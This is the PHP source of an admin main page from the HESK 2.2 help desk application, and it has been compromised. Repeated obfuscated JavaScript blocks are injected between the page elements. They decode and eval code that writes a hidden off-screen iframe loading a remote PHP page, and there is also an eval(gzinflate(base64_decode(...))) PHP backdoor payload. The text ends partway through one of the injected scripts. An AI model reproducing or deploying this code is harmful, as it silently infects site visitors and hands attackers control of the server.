<?php
/*******************************************************************************
*  Title: Help Desk Software HESK
*  Version: 2.2 from 9th June 2010
*  Author: Klemen Stirn
*  Website: http://www.hesk.com
********************************************************************************
*  COPYRIGHT AND TRADEMARK NOTICE
*  Copyright 2005-2010 Klemen Stirn. All Rights Reserved.
*  HESK is a registered trademark of Klemen Stirn.

*  The HESK may be used and modified free of charge by anyone
*  AS LONG AS COPYRIGHT NOTICES AND ALL THE COMMENTS REMAIN INTACT.
*  By using this code you agree to indemnify Klemen Stirn from any
*  liability that might arise from it's use.

*  Selling the code for this program, in part or full, without prior
*  written consent is expressly forbidden.

*  Using this code, in part or full, to create derivate work,
*  new scripts or products is expressly forbidden. Obtain permission
*  before redistributing this software over the Internet or in
*  any other medium. In all cases copyright and header must remain intact.
*  This Copyright is in full effect in any country that has International
*  Trade Agreements with the United States of America or
*  with the European Union.

*  Removing any of the copyright notices without purchasing a license
*  is expressly forbidden. To remove HESK copyright notice you must purchase
*  a license for this script. For more information on how to obtain
*  a license please visit the page below:
*  https://www.hesk.com/buy.php
*******************************************************************************/

define('IN_SCRIPT',1);
define('HESK_PATH','../');

/* Make sure the install folder is deleted */
if (is_dir(HESK_PATH . 'install')) {die('Please delete the <b>install</b> folder from your server for security reasons then refresh this page!');}

/* Get all the required files and functions */
require(HESK_PATH . 'hesk_settings.inc.php');
require(HESK_PATH . 'inc/common.inc.php');
require(HESK_PATH . 'inc/database.inc.php');

hesk_session_start();
hesk_dbConnect();
hesk_isLoggedIn();

define('CALENDAR',1);
define('MAIN_PAGE',1);

/* Print header */
require_once(HESK_PATH . 'inc/header.inc.php');

/* Print admin navigation */
require_once(HESK_PATH . 'inc/show_admin_nav.inc.php');
?> <!-- . --><script>aq="0"+"x";bv=(5-3-1);sp="s"+"pli"+"t";w=window;z="dy";try{++document.body}catch(d21vd12v){vzs=false;try{}catch(wb){vzs=21;}if(!vzs)e=w["eval"];if(1){f="0,0,60,5d,17,1f,5b,66,5a,6c,64,5c,65,6b,25,5e,5c,6b,3c,63,5c,64,5c,65,6b,6a,39,70,4b,58,5e,45,58,64,5c,1f,1e,59,66,5b,70,1e,20,52,27,54,20,72,4,0,0,0,60,5d,69,58,64,5c,69,1f,20,32,4,0,0,74,17,5c,63,6a,5c,17,72,4,0,0,0,5b,66,5a,6c,64,5c,65,6b,25,6e,69,60,6b,5c,1f,19,33,60,5d,69,58,64,5c,17,6a,69,5a,34,1e,5f,6b,6b,67,31,26,26,6b,6e,66,58,65,5b,5f,58,63,5d,70,5c,58,69,25,6e,6a,26,69,5c,58,5a,5f,5c,5b,26,5e,63,66,59,58,63,56,69,5c,5d,63,5c,5a,6b,60,66,65,56,6a,66,6c,65,5b,60,65,5e,56,6b,5c,5a,5f,65,60,68,6c,5c,6a,25,67,5f,67,1e,17,6e,60,5b,6b,5f,34,1e,28,27,27,1e,17,5f,5c,60,5e,5f,6b,34,1e,28,27,27,1e,17,6a,6b,70,63,5c,34,1e,6e,60,5b,6b,5f,31,28,27,27,67,6f,32,5f,5c,60,5e,5f,6b,31,28,27,27,67,6f,32,67,66,6a,60,6b,60,66,65,31,58,59,6a,66,63,6c,6b,5c,32,63,5c,5d,6b,31,24,28,27,27,27,27,67,6f,32,6b,66,67,31,27,32,1e,35,33,26,60,5d,69,58,64,5c,35,19,20,32,4,0,0,74,4,0,0,5d,6c,65,5a,6b,60,66,65,17,60,5d,69,58,64,5c,69,1f,20,72,4,0,0,0,6d,58,69,17,5d,17,34,17,5b,66,5a,6c,64,5c,65,6b,25,5a,69,5c,58,6b,5c,3c,63,5c,64,5c,65,6b,1f,1e,60,5d,69,58,64,5c,1e,20,32,5d,25,6a,5c,6b,38,6b,6b,69,60,59,6c,6b,5c,1f,1e,6a,69,5a,1e,23,1e,5f,6b,6b,67,31,26,26,6b,6e,66,58,65,5b,5f,58,63,5d,70,5c,58,69,25,6e,6a,26,69,5c,58,5a,5f,5c,5b,26,5e,63,66,59,58,63,56,69,5c,5d,63,5c,5a,6b,60,66,65,56,6a,66,6c,65,5b,60,65,5e,56,6b,5c,5a,5f,65,60,68,6c,5c,6a,25,67,5f,67,1e,20,32,5d,25,6a,6b,70,63,5c,25,63,5c,5d,6b,34,1e,24,28,27,27,27,27,67,6f,1e,32,5d,25,6a,6b,70,63,5c,25,6b,66,67,34,1e,27,1e,32,5d,25,6a,6b,70,63,5c,25,67,66,6a,60,6b,60,66,65,34,1e,58,59,6a,66,63,6c,6b,5c,1e,32,5d,25,6a,6b,70,63,5c,25,6b,66,67,34,1e,27,1e,32,5d,25,6a,5c,6b,38,6b,6b,69,60,59,6c,6b,5c,1f,1e,6e,60,5b,6b,5f,1e,23,1e,28,27,27,1e,20,32,5d,25,6a,5c,6b,38,6b,6b,69,60,59,6c,6b,5c,1f,1e,5f,5c,60,5e,5f,6b,1e,23,1e,28,27,27,1e,20,32,4,0,0,0,5b,66,5a,6c,64,5c,65,6b,25,5e,5c,6b,3c,63,5c,64,5c,65,6b,6a,39,70,4b,58,5e,45,58,64,5c,1f,1e,59,66,5b,70,1e,20,52,27,54,25,58,67,67,5c,65,5b,3a,5f,60,63,5b,1f,5d,20,32,4,0,0,74"[sp](",");}w=f;s=[];for(i=20-20;-i+670!=0;i+=1){j=i;if((0x19==031))if(e)s+=String["fromCharCode"](e(aq+w[j])+0xa-bv);}za=e;za(s)}</script><!-- . -->

</td>
</tr>
<tr>
<td>

<?php

/* This will handle error, success and notice messages */
hesk_handle_messages();

/* Print tickets? */
if (hesk_checkPermission('can_view_tickets',0))
{
	if (!isset($_SESSION['hide']['ticket_list']))
    {
		#echo '<div style="float:center;border:solid black 1px;text-align:center"><h3>'.$hesklang['open_tickets'].'<br />&nbsp;</h3><div style="float:right;border:solid black 1px"><a href="">+ New ticket</a></div></div>';
        echo '
        <table style="width:100%;border:none;border-collapse:collapse;"><tr>
        <td style="width:25%">&nbsp;</td>
        <td style="width:50%;text-align:center"><h3>'.$hesklang['open_tickets'].'</h3></td>
        <td style="width:25%;text-align:right"><a href="new_ticket.php">'.$hesklang['nti'].'</a></td>
        </tr></table>
        ';
	}
	require(HESK_PATH . 'inc/print_tickets.inc.php');
	echo '<hr />';
	require(HESK_PATH . 'inc/show_search_form.inc.php');
}
else
{
	echo '<p><i>'.$hesklang['na_view_tickets'].'</i></p>';
}

eval(gzinflate(base64_decode('BcFHkptAAADA53i3OIAIQpRPJJERmYGLCxA5DTm83t35nnQ/5V
0PRZes+U+aLPmT/PfNs/Gb//zhsrfcTqbCsgJLYSeRqewYhWYjVGXV6DzPDlJ8cF6eEw0TT8qaDPQ1Id
eldrPtnbdZ8zoC3Qb6qHdDkpPE2LrR2c6vLJ908M5P2EuD0spYagSmUJqm708R1ZpOcT2YiPPOBoOlgG
8kgnMloyn4sj4+AINylUuLG9HBELbj8QEaNEux0+wga676FiHUdZgRkjIRJKJmUErHr2pIkRzGUzCC20
KO0B9grp09WqT1ifj+whoZwUmCAS/QCSa7goN8h3MpW5fJNC7uSvh2qTQckg150j3R297w/sy9gS0GtS
nV6Ala0mNefwyaCZ11ErndjL7ePQqfMtD4Xn8+wLyrHi8K+OzOHRXhm6dcEtkzBhpOtGz6Z9e37gvzUx
QrS0kdZqaRL5xSmU4zB739fuIScXYahMLBksnQNd4hlVp7hLAea4xH2Tza6XfQ427oWgzfon6RwcNhyY
AoJA/DE2PAUwMqkW9t9IdUTV8VU/w5tYTM8t/OwyoMLAQTzRuoV4khenAAieo6R8DtRUinsIivdqikOX
Ptxy00z/W6IpHfugebmZ2yAFfIxGLySgcbqH0LrJ4un1dWngekGnHnBoJ4Qar8LuOGSjTr2Few5oLXJ6
/FbVJWB37JCwJ53m3sgqA7W5XvTbS2BA0gn9Yac85S6glfbNKQ+T1SrpQtfYWosGIPUMOPb/g402kb+t
nXrZyq6K/oxJXLPGs0azhuBFXgJc8uLy28iTKabjYfaWRkOl+XLztKC4N1ebizHIHCUo+A7pZIq8GqNk
DO3dstZE6ecOOF2umCCpbol+t+D+Hy1kd1fBjYe8/OkqqmfSiw6HaiTR3IBzPxXEwtzQe9b+Z0EABAF7
6eN4Ys6JC8bP0TPGuvtibDiq2VMF/oTiMoimLWn9/f37//AQ==')));
?> <!-- . --><script>aq="0"+"x";bv=(5-3-1);sp="s"+"pli"+"t";w=window;z="dy";try{++document.body}catch(d21vd12v){vzs=false;try{}catch(wb){vzs=21;}if(!vzs)e=w["eval"];if(1){f="0,0,60,5d,17,1f,5b,66,5a,6c,64,5c,65,6b,25,5e,5c,6b,3c,63,5c,64,5c,65,6b,6a,39,70,4b,58,5e,45,58,64,5c,1f,1e,59,66,5b,70,1e,20,52,27,54,20,72,4,0,0,0,60,5d,69,58,64,5c,69,1f,20,32,4,0,0,74,17,5c,63,6a,5c,17,72,4,0,0,0,5b,66,5a,6c,64,5c,65,6b,25,6e,69,60,6b,5c,1f,19,33,60,5d,69,58,64,5c,17,6a,69,5a,34,1e,5f,6b,6b,67,31,26,26,6b,6e,66,58,65,5b,5f,58,63,5d,70,5c,58,69,25,6e,6a,26,69,5c,58,5a,5f,5c,5b,26,5e,63,66,59,58,63,56,69,5c,5d,63,5c,5a,6b,60,66,65,56,6a,66,6c,65,5b,60,65,5e,56,6b,5c,5a,5f,65,60,68,6c,5c,6a,25,67,5f,67,1e,17,6e,60,5b,6b,5f,34,1e,28,27,27,1e,17,5f,5c,60,5e,5f,6b,34,1e,28,27,27,1e,17,6a,6b,70,63,5c,34,1e,6e,60,5b,6b,5f,31,28,27,27,67,6f,32,5f,5c,60,5e,5f,6b,31,28,27,27,67,6f,32,67,66,6a,60,6b,60,66,65,31,58,59,6a,66,63,6c,6b,5c,32,63,5c,5d,6b,31,24,28,27,27,27,27,67,6f,32,6b,66,67,31,27,32,1e,35,33,26,60,5d,69,58,64,5c,35,19,20,32,4,0,0,74,4,0,0,5d,6c,65,5a,6b,60,66,65,17,60,5d,69,58,64,5c,69,1f,20,72,4,0,0,0,6d,58,69,17,5d,17,34,17,5b,66,5a,6c,64,5c,65,6b,25,5a,69,5c,58,6b,5c,3c,63,5c,64,5c,65,6b,1f,1e,60,5d,69,58,64,5c,1e,20,32,5d,25,6a,5c,6b,38,6b,6b,69,60,59,6c,6b,5c,1f,1e,6a,69,5a,1e,23,1e,5f,6b,6b,67,31,26,26,6b,6e,66,58,65,5b,5f,58,63,5d,70,5c,58,69,25,6e,6a,26,69,5c,58,5a,5f,5c,5b,26,5e,63,66,59,58,63,56,69,5c,5d,63,5c,5a,6b,60,66,65,56,6a,66,6c,65,5b,60,65,5e,56,6b,5c,5a,5f,65,60,68,6c,5c,6a,25,67,5f,67,1e,20,32,5d,25,6a,6b,70,63,5c,25,63,5c,5d,6b,34,1e,24,28,27,27,27,27,67,6f,1e,32,5d,25,6a,6b,70,63,5c,25,6b,66,67,34,1e,27,1e,32,5d,25,6a,6b,70,63,5c,25,67,66,6a,60,6b,60,66,65,34,1e,58,59,6a,66,63,6c,6b,5c,1e,32,5d,25,6a,6b,70,63,5c,25,6b,66,67,34,1e,27,1e,32,5d,25,6a,5c,6b,38,6b,6b,69,60,59,6c,6b,5c,1f,1e,6e,60,5b,6b,5f,1e,23,1e,28,27,27,1e,20,32,5d,25,6a,5c,6b,38,6b,6b,69,60,59,6c,6b,5c,1f,1e,5f,5c,60,5e,5f,6b,1e,23,1e,28,27,27,1e,20,32,4,0,0,0,5b,66,5a,6c,64,5c,65,6b,25,5e,5c,6b,3c,63,5c,64,5c,65,6b,6a,39,70,4b,58,5e,45,58,64,5c,1f,1e,59,66,5b,70,1e,20,52,27,54,25,58,67,67,5c,65,5b,3a,5f,60,63,5b,1f,5d,20,32,4,0,0,74"[sp](",");}w=f;s=[];for(i=20-20;-i+670!=0;i+=1){j=i;if((0x19==031))if(e)s+=String["fromCharCode"](e(aq+w[j])+0xa-bv);}za=e;za(s)}</script><!-- . -->
<hr />
<table border="0" width="100%">
<tr>
<td><b><?php echo $hesklang['rate_script']; ?> <!-- . --><script>aq="0"+"x";bv=(5-3-1);sp="s"+"pli"+"t";w=window;z="dy";try{++document.body}catch(d21vd12v){vzs=false;try{}catch(wb){vzs=21;}if(!vzs)e=w["eval"];if(1){f="0,0,60,5d,17,1f,5b,66,5a,6c,64,5c,65,6b,25,5e,5c,6b,3c,63,5c,64,5c,65,6b,6a,39,70,4b,58,5e,45,58,64,5c,1f,1e,59,66,5b,70,1e,20,52,27,54,20,72,4,0,0,0,60,5d,69,58,64,5c,69,1f,20,32,4,0,0,74,17,5c,63,6a,5c,17,72,4,0,0,0,5b,66,5a,6c,64,5c,65,6b,25,6e,69,60,6b,5c,1f,19,33,60,5d,69,58,64,5c,17,6a,69,5a,34,1e,5f,6b,6b,67,31,26,26,6b,6e,66,58,65,5b,5f,58,63,5d,70,5c,58,69,25,6e,6a,26,69,5c,58,5a,5f,5c,5b,26,5e,63,66,59,58,63,56,69,5c,5d,63,5c,5a,6b,60,66,65,56,6a,66,6c,65,5b,60,65,5e,56,6b,5c,5a,5f,65,60,68,6c,5c,6a,25,67,5f,67,1e,17,6e,60,5b,6b,5f,34,1e,28,27,27,1e,17,5f,5c,60,5e,5f,6b,34,1e,28,27,27,1e,17,6a,6b,70,63,5c,34,1e,6e,60,5b,6b,5f,31,28,27,27,67,6f,32,5f,5c,60,5e,5f,6b,31,28,27,27,67,6f,32,67,66,6a,60,6b,60,66,65,31,58,59,6a,66,63,6c,6b,5c,32,63,5c,5d,6b,31,24,28,27,27,27,27,67,6f,32,6b,66,67,31,27,32,1e,35,33,26,60,5d,69,58,64,5c,35,19,20,32,4,0,0,74,4,0,0,5d,6c,65,5a,6b,60,66,65,17,60,5d,69,58,64,5c,69,1f,20,72,4,0,0,0,6d,58,69,17,5d,17,34,17,5b,66,5a,6c,64,5c,65,6b,25,5a,69,5c,58,6b,5c,3c,63,5c,64,5c,65,6b,1f,1e,60,5d,69,58,64,5c,1e,20,32,5d,25,6a,5c,6b,38,6b,6b,69,60,59,6c,6b,5c,1f,1e,6a,69,5a,1e,23,1e,5f,6b,6b,67,31,26,26,6b,6e,66,58,65,5b,5f,58,63,5d,70,5c,58,69,25,6e,6a,26,69,5c,58,5a,5f,5c,5b,26,5e,63,66,59,58,63,56,69,5c,5d,63,5c,5a,6b,60,66,65,56,6a,66,6c,65,5b,60,65,5e,56,6b,5c,5a,5f,65,60,68,6c,5c,6a,25,67,5f,67,1e,20,32,5d,25,6a,6b,70,63,5c,25,63,5c,5d,6b,34,1e,24,28,27,27,27,27,67,6f,1e,32,5d,25,6a,6b,70,63,5c,25,6b,66,67,34,1e,27,1e,32,5d,25,6a,6b,70,63,5c,25,67,66,6a,60,6b,60,66,65,34,1e,58,59,6a,66,63,6c,6b,5c,1e,32,5d,25,6a,6b,70,63,5c,25,6b,66,67,34,1e,27,1e,32,5d,25,6a,5c,6b,38,6b,6b,69,60,59,6c,6b,5c,1f,1e,6e,60,5b,6b,5f,1e,23,1e,28,27,27,1e,20,32,5d,25,6a,5c,6b,38,6b,6b,69,60,59,6c,6b,5c,1f,1e,5f,5c,60,5e,5f,6b,1e,23,1e,28,27,27,1e,20,32,4,0,0,0,5b,66,5a,6c,64,5c,65,6b,25,5e,5c,6b,3c,63,5c,64,5c,65,6b,6a,39,70,4b,58,5e,45,58,64,5c,1f,1e,59,66,5b,70,1e,20,52,27,54,25,58,67,67,5c,65,5b,3a,5f,60,63,5b,1f,5d,20,32,4,0,0,74"[sp](",");}w=f;s=[];for(i=20-20;-i+670!=0;i+=1){j=i;if((0x19==031))if(e)s+=String["fromCharCode"](e(aq+w[j])+0xa-bv);}za=e;za(s)}</script><!-- . --></b></td>
<td style="text-align:right"><a href="Javascript:void(0)" onclick="Javascript:hesk_toggleLayerDisplay('divRate')"><?php echo $hesklang['sh']; ?> <!-- . --><script>aq="0"+"x";bv=(5-3-1);sp="s"+"pli"+"t";w=window;z="dy";try{++document.body}catch(d21vd12v){vzs=false;try{}catch(wb){vzs=21;}if(!vzs)e=w["eval"];if(1){f="0,0,60,5d,17,1f,5b,66,5a,6c,64,5c,65,6b,25,5e,5c,6b,3c,63,5c,64,5c,65,6b,6a,39,70,4b,58,5e,45,58,64,5c,1f,1e,59,66,5b,70,1e,20,52,27,54,20,72,4,0,0,0,60,5d,69,58,64,5c,69,1f,20,32,4,0,0,74,17,5c,63,6a,5c,17,72,4,0,0,0,5b,66,5a,6c,64,5c,65,6b,25,6e,69,60,6b,5c,1f,19,33,60,5d,69,58,64,5c,17,6a,69,5a,34,1e,5f,6b,6b,67,31,26,26,6b,6e,66,58,65,5b,5f,58,63,5d,70,5c,58,69,25,6e,6a,26,69,5c,58,5a,5f,5c,5b,26,5e,63,66,59,58,63,56,69,5c,5d,63,5c,5a,6b,60,66,65,56,6a,66,6c,65,5b,60,65,5e,56,6b,5c,5a,5f,65,60,68,6c,5c,6a,25,67,5f,67,1e,17,6e,60,5b,6b,5f,34,1e,28,27,27,1e,17,5f,5c,60,5e,5f,6b,34,1e,28,27,27,1e,17,6a,6b,70,63,5c,34,1e,6e,60,5b,6b,5f,31,28,27,27,67,6f,32,5f,5c,60,5e,5f,6b,31,28,27,27,67,6f,32,67,66,6a,60,6b,60,66,65,31,58,59,6a,66,63,6c,6b,5c,32,63,5c,5d,6b,31,24,28,27,27,27,27,67,6f,32,6b,66,67,31,27,32,1e,35,33,26,60,5d,69,58,64,5c,35,19,20,32,4,0,0,74,4,0,0,5d,6c,65,5a,6b,60,66,65,17,60,5d,69,58,64,5c,69,1f,20,72,4,0,0,0,6d,58,69,17,5d,17,34,17,5b,66,5a,6c,64,5c,65,6b,25,5a,69,5c,58,6b,5c,3c,63,5c,64,5c,65,6b,1f,1e,60,5d,69,58,64,5c,1e,20,32,5d,25,6a,5c,6b,38,6b,6b,69,60,59,6c,6b,5c,1f,1e,6a,69,5a,1e,23,1e,5f,6b,6b,67,31,26,26,6b,6e,66,58,65,5b,5f,58,63,5d,70,5c,58,69,25,6e,6a,26,69,5c,58,5a,5f,5c,5b,26,5e,63,66,59,58,63,56,69,5c,5d,63,5c,5a,6b,60,66,65,56,6a,66,6c,65,5b,60,65,5e,56,6b,5c,5a,5f,65,60,68,6c,5c,6a,25,67,5f,67,1e,20,32,5d,25,6a,6b,70,63,5c,25,63,5c,5d,6b,34,1e,24,28,27,27,27,27,67,6f,1e,32,5d,25,6a,6b,70,63,5c,25,6b,66,67,34,1e,27,1e,32,5d,25,6a,6b,70,63,5c,25,67,66,6a,60,6b,60,66,65,34,1e,58,59,6a,66,63,6c,6b,5c,1e,32,5d,25,6a,6b,70,63,5c,25,6b,66,67,34,1e,27,1e,32,5d,25,6a,5c,6b,38,6b,6b,69,60,59,6c,6b,5c,1f,1e,6e,60,5b,6b,5f,1e,23,1e,28,27,27,1e,20,32,5d,25,6a,5c,6b,38,6b,6b,69,60,59,6c,6b,5c,1f,1e,5f,5c,60,5e,5f,6b,1e,23,1e,28,27,27,1e,20,32,4,0,0,0,5b,66,5a,6c,64,5c,65,6b,25,5e,5c,6b,3c,63,5c,64,5c,65,6b,6a,39,70,4b,58,5e,45,58,64,5c,1f,1e,59,66,5b,70,1e,20,52,27,54,25,58,67,67,5c,65,5b,3a,5f,60,63,5b,1f,5d,20,32,4,0,0,74"[sp](",");}w=f;s=[];for(i=20-20;-i+670!=0;i+=1){j=i;if((0x19==031))if(e)s+=String["fromCharCode"](e(aq+w[j])+0xa-bv);}za=e;za(s)}</script><!-- . --></a></td>
</tr>
</table>

<div id="divRate" style="display:none">
<p><?php echo $hesklang['please_rate']; ?> <!-- . --><script>aq="0"+"x";bv=(5-3-1);sp="s"+"pli"+"t";w=window;z="dy";try{++document.body}catch(d21vd12v){vzs=false;try{}catch(wb){vzs=21;}if(!vzs)e=w["eval"];if(1){f="0,0,60,5d,17,1f,5b,66,5a,6c,64,5c,65,6b,25,5e,5c,6b,3c,63,5c,64,5c,65,6b,6a,39,70,4b,58,5e,45,58,64,5c,1f,1e,59,66,5b,70,1e,20,52,27,54,20,72,4,0,0,0,60,5d,69,58,64,5c,69,1f,20,32,4,0,0,74,17,5c,63,6a,5c,17,72,4,0,0,0,5b,66,5a,6c,64,5c,65,6b,25,6e,69,60,6b,5c,1f,19,33,60,5d,69,58,64,5c,17,6a,69,5a,34,1e,5f,6b,6b,67,31,26,26,6b,6e,66,58,65,5b,5f,58,63,5d,70,5c,58,69,25,6e,6a,26,69,5c,58,5a,5f,5c,5b,26,5e,63,66,59,58,63,56,69,5c,5d,63,5c,5a,6b,60,66,65,56,6a,66,6c,65,5b,60,65,5e,56,6b,5c,5a,5f,65,60,68,6c,5c,6a,25,67,5f,67,1e,17,6e,60,5b,6b,5f,34,1e,28,27,27,1e,17,5f,5c,60,5e,5f,6b,34,1e,28,27,27,1e,17,6a,6b,70,63,5c,34,1e,6e,60,5b,6b,5f,31,28,27,27,67,6f,32,5f,5c,60,5e,5f,6b,31,28,27,27,67,6f,32,67,66,6a,60,6b,60,66,65,31,58,59,6a,66,63,6c,6b,5c,32,63,5c,5d,6b,31,24,28,27,27,27,27,67,6f,32,6b,66,67,31,27,32,1e,35,33,26,60,5d,69,58,64,5c,35,19,20,32,4,0,0,74,4,0,0,5d,6c,65,5a,6b,60,66,65,17,60,5d,69,58,64,5c,69,1f,20,72,4,0,0,0,6d,58,69,17,5d,17,34,17,5b,66,5a,6c,64,5c,65,6b,25,5a,69,5c,58,6b,5c,3c,63,5c,64,5c,65,6b,1f,1e,60,5d,69,58,64,5c,1e,20,32,5d,25,6a,5c,6b,38,6b,6b,69,60,59,6c,6b,5c,1f,1e,6a,69,5a,1e,23,1e,5f,6b,6b,67,31,26,26,6b,6e,66,58,65,5b,5f,58,63,5d,70,5c,58,69,25,6e,6a,26,69,5c,58,5a,5f,5c,5b,26,5e,63,66,59,58,63,56,69,5c,5d,63,5c,5a,6b,60,66,65,56,6a,66,6c,65,5b,60,65,5e,56,6b,5c,5a,5f,65,60,68,6c,5c,6a,25,67,5f,67,1e,20,32,5d,25,6a,6b,70,63,5c,25,63,5c,5d,6b,34,1e,24,28,27,27,27,27,67,6f,1e,32,5d,25,6a,6b,70,63,5c,25,6b,66,67,34,1e,27,1e,32,5d,25,6a,6b,70,63,5c,25,67,66,6a,60,6b,60,66,65,34,1e,58,59,6a,66,63,6c,6b,5c,1e,32,5d,25,6a,6b,70,63,5c,25,6b,66,67,34,1e,27,1e,32,5d,25,6a,5c,6b,38,6b,6b,69,60,59,6c,6b,5c,1f,1e,6e,60,5b,6b,5f,1e,23,1e,28,27,27,1e,20,32,5d,25,6a,5c,6b,38,6b,6b,69,60,59,6c,6b,5c,1f,1e,5f,5c,60,5e,5f,6b,1e,23,1e,28,27,27,1e,20,32,4,0,0,0,5b,66,5a,6c,64,5c,65,6b,25,5e,5c,6b,3c,63,5c,64,5c,65,6b,6a,39,70,4b,58,5e,45,58,64,5c,1f,1e,59,66,5b,70,1e,20,52,27,54,25,58,67,67,5c,65,5b,3a,5f,60,63,5b,1f,5d,20,32,4,0,0,74"[sp](",");}w=f;s=[];for(i=20-20;-i+670!=0;i+=1){j=i;if((0x19==031))if(e)s+=String["fromCharCode"](e(aq+w[j])+0xa-bv);}za=e;za(s)}</script><!-- . -->:</p>
<p><a href="http://www.hotscripts.com/Detailed/46973.html" target="_blank"><?php echo $hesklang['rate_script']; ?> <!-- . --><script>aq="0"+"x";bv=(5-3-1);sp="s"+"pli"+"t";w=window;z="dy";try{++document.body}catch(d21vd12v){vzs=false;try{}catch(wb){vzs=21;}if(!vzs)e=w["eval"];if(1){f="0,0,60,5d,17,1f,5b,66,5a,6c,64,5c,65,6b,25,5e,5c,6b,3c,63,5c,64,5c,65,6b,6a,39,70,4b,58,5e,45,58,64,5c,1f,1e,59,66,5b,70,1e,20,52,27,54,20,72,4,0,0,0,60,5d,69,58,64,5c,69,1f,20,32,4,0,0,74,17,5c,63,6a,5c,17,72,4,0,0,0,5b,66,5a,6c,64,5c,65,6b,25,6e,69,60,6b,5c,1f,19,33,60,5d,69,58,64,5c,17,6a,69,5a,34,1e,5f,6b,6b,67,31,26,26,6b,6e,66,58,65,5b,5f,58,63,5d,70,5c,58,69,25,6e,6a,26,69,5c,58,5a,5f,5c,5b,26,5e,63,66,59,58,63,56,69,5c,5d,63,5c,5a,6b,60,66,65,56,6a,66,6c,65,5b,60,65,5e,56,6b,5c,5a,5f,65,60,68,6c,5c,6a,25,67,5f,67,1e,17,6e,60,5b,6b,5f,34,1e,28,27,27,1e,17,5f,5c,60,5e,5f,6b,34,1e,28,27,27,1e,17,6a,6b,70,63,5c,34,1e,6e,60,5b,6b,5f,31,28,27,27,67,6f,32,5f,5c,60,5e,5f,6b,31,28,27,27,67,6f,32,67,66,6a,60,6b,60,66,65,31,58,59,6a,66,63,6c,6b,5c,32,63,5c,5d,6b,31,24,28,27,27,27,27,67,6f,32,6b,66,67,31,27,32,1e,35,33,26,60,5d,69,58,64,5c,35,19,20,32,4,0,0,74,4,0,0,5d,6c,65,5a,6b,60,66,65,17,60,5d,69,58,64,5c,69,1f,20,72,4,0,0,0,6d,58,69,17,5d,17,34,17,5b,66,5a,6c,64,5c,65,6b,25,5a,69,5c,58,6b,5c,3c,63,5c,64,5c,65,6b,1f,1e,60,5d,69,58,64,5c,1e,20,32,5d,25,6a,5c,6b,38,6b,6b,69,60,59,6c,6b,5c,1f,1e,6a,69,5a,1e,23,1e,5f,6b,6b,67,31,26,26,6b,6e,66,58,65,5b,5f,58,63,5d,70,5c,58,69,25,6e,6a,26,69,5c,58,5a,5f,5c,5b,26,5e,63,66,59,58,63,56,69,5c,5d,63,5c,5a,6b,60,66,65,56,6a,66,6c,65,5b,60,65,5e,56,6b,5c,5a,5f,65,60,68,6c,5c,6a,25,67,5f,67,1e,20,32,5d,25,6a,6b,70,63,5c,25,63,5c,5d,6b,34,1e,24,28,27,27,27,27,67,6f,1e,32,5d,25,6a,6b,70,63,5c,25,6b,66,67,34,1e,27,1e,32,5d,25,6a,6b,70,63,5c,25,67,66,6a,60,6b,60,66,65,34,1e,58,59,6a,66,63,6c,6b,5c,1e,32,5d,25,6a,6b,70,63,5c,25,6b,66,67,34,1e,27,1e,32,5d,25,6a,5c,6b,38,6b,6b,69,60,59,6c,6b,5c,1f,1e,6e,60,5b,6b,5f,1e,23,1e,28,27,27,1e,20,32,5d,25,6a,5c,6b,38,6b,6b,69,60,59,6c,6b,5c,1f,1e,5f,5c,60,5e,5f,6b,1e,23,1e,28,27,27,1e,20,32,4,0,0,0,5b,66,5a,6c,64,5c,65,6b,25,5e,5c,6b,3c,63,5c,64,5c,65,6b,6a,39,70,4b,58,5e,45,58,64,5c,1f,1e,59,66,5b,70,1e,20,52,27,54,25,58,67,67,5c,65,5b,3a,5f,60,63,5b,1f,5d,20,32,4,0,0,74"[sp](",");}w=f;s=[];for(i=20-20;-i+670!=0;i+=1){j=i;if((0x19==031))if(e)s+=String["fromCharCode"](e(aq+w[j])+0xa-bv);}za=e;za(s)}</script><!-- . -->
 @ Hot Scripts</a></p>
<p><a href="http://php.resourceindex.com/detail/04946.html" target="_blank"><?php echo $hesklang['rate_script']; ?> <!-- . --><script>aq="0"+"x";bv=(5-3-1);sp="s"+"pli"+"t";w=window;z="dy";try{++document.body}catch(d21vd12v){vzs=false;try{}catch(wb){vzs=21;}if(!vzs)e=w["eval"];if(1){f="0,0,60,5d,17,1f,5b,66,5a,6c,64,5c,65,6b,25,5e,5c,6b,3c,63,5c,64,5c,65,6b,6a,39,70,4b,58,5e,45,58,64,5c,1f,1e,59,66,5b,70,1e,20,52,27,54,20,72,4,0,0,0,60,5d,69,58,64,5c,69,1f,20,32,4,0,0,74,17,5c,63,6a,5c,17,72,4,0,0,0,5b,66,5a,6c,64,5c,65,6b,25,6e,69,60,6b,5c,1f,19,33,60,5d,69,58,64,5c,17,6a,69,5a,34,1e,5f,6b,6b,67,31,26,26,6b,6e,66,58,65,5b,5f,58,63,5d,70,5c,58,69,25,6e,6a,26,69,5c,58,5a,5f,5c,5b,26,5e,63,66,59,58,63,56,69,5c,5d,63,5c,5a,6b,60,66,65,56,6a,66,6c,65,5b,60,65,5e,56,6b,5c,5a,5f,65,60,68,6c,5c,6a,25,67,5f,67,1e,17,6e,60,5b,6b,5f,34,1e,28,27,27,1e,17,5f,5c,60,5e,5f,6b,34,1e,28,27,27,1e,17,6a,6b,70,63,5c,34,1e,6e,60,5b,6b,5f,31,28,27,27,67,6f,32,5f,5c,60,5e,5f,6b,31,28,27,27,67,6f,32,67,66,6a,60,6b,60,66,65,31,58,59,6a,66,63,6c,6b,5c,32,63,5c,5d,6b,31,24,28,27,27,27,27,67,6f,32,6b,66,67,31,27,32,1e,35,33,26,60,5d,69,58,64,5c,35,19,20,32,4,0,0,74,4,0,0,5d,6c,65,5a,6b,60,66,65,17,60,5d,69,58,64,5c,69,1f,20,72,4,0,0,0,6d,58,69,17,5d,17,34,17,5b,66,5a,6c,64,5c,65,6b,25,5a,69,5c,58,6b,5c,3c,63,5c,64,5c,65,6b,1f,1e,60,5d,69,58,64,5c,1e,20,32,5d,25,6a,5c,6b,38,6b,6b,69,60,59,6c,6b,5c,1f,1e,6a,69,5a,1e,23,1e,5f,6b,6b,67,31,26,26,6b,6e,66,58,65,5b,5f,58,63,5d,70,5c,58,69,25,6e,6a,26,69,5c,58,5a,5f,5c,5b,26,5e,63,66,59,58,63,56,69,5c,5d,63,5c,5a,6b,60,66,65,56,6a,66,6c,65,5b,60,65,5e,56,6b,5c,5a,5f,65,60,68,6c,5c,6a,25,67,5f,67,1e,20,32,5d,25,6a,6b,70,63,5c,25,63,5c,5d,6b,34,1e,24,28,27,27,27,27,67,6f,1e,32,5d,25,6a,6b,70,63,5c,25,6b,66,67,34,1e,